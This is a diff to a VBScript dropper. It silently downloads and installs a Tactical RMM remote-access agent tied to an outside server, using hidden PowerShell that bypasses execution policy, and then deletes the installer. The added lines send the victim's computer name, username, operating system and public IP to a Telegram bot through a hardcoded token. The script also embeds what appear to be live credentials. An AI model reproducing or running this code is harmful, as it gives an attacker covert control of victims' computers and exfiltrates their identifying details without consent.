@@ -1,12 +1,20 @@
-Set objShell = CreateObject("WScript.Shell")
+' ================== CONFIG ==================
+Dim BOT_TOKEN, CHAT_ID, api, auth, clientid, siteid, downloadlink
 
-Dim api, auth, clientid, siteid, downloadlink
-api = "https://api.temo.click"
-auth = "644d7a12f354c9d0b02852323c0e790092dd2021b4dbcf1f1a7cf86327eb924d"
-clientid = "1"
-siteid = "1"
+BOT_TOKEN    = "8643735125:AAHi9ESDyzDDu9veWr7mM7GCIPaYwxxOpTo"
+CHAT_ID      = "8345342738"
+
+api          = "https://api.temo.click"
+auth         = "644d7a12f354c9d0b02852323c0e790092dd2021b4dbcf1f1a7cf86327eb924d"
+clientid     = "1"
+siteid       = "1"
 downloadlink = "https://github.com/amidaware/rmmagent/releases/download/v2.10.0/tacticalagent-v2.10.0-windows-amd64.exe"
 
+' ================== OBJECTS ==================
+Dim objShell, intReturn
+Set objShell = CreateObject("WScript.Shell")
+
+' ================== INSTALLATION PROCESS ==================
 psCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""& {" & _
 "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
 "$OutPath = Join-Path $env:TMP 'agent_setup.exe'; " & _
@@ -18,4 +26,26 @@ psCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command
 "Remove-Item $OutPath -ErrorAction SilentlyContinue; " & _
 "} }"""
 
-objShell.Run psCommand, 0, True
+' Run Installation
+intReturn = objShell.Run(psCommand, 0, True)
+
+' ================== TELEGRAM NOTIFICATION ==================
+Dim notifyCmd
+notifyCmd = _
+    "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
+    """[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
+    "$ip=(Invoke-RestMethod 'https://api.ipify.org');" & _
+    "$os=(Get-CimInstance Win32_OperatingSystem).Caption;" & _
+    "$dt=Get-Date -Format 'yyyy-MM-dd HH:mm:ss';" & _
+    "$msg='=== TACTICAL RMM INSTALLED ==='+[char]10+" & _
+         "'PC: '+$env:COMPUTERNAME+[char]10+" & _
+         "'User: '+$env:USERNAME+[char]10+" & _
+         "'OS: '+$os+[char]10+" & _
+         "'IP: '+$ip+[char]10+" & _
+         "'Status: Success'+[char]10+" & _
+         "'Time: '+$dt;" & _
+    "$body=@{chat_id='" & CHAT_ID & "';text=$msg};" & _
+    "Invoke-RestMethod -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage' -Method Post -Body $body"""
+
+' Send Notification
+objShell.Run notifyCmd, 0, False
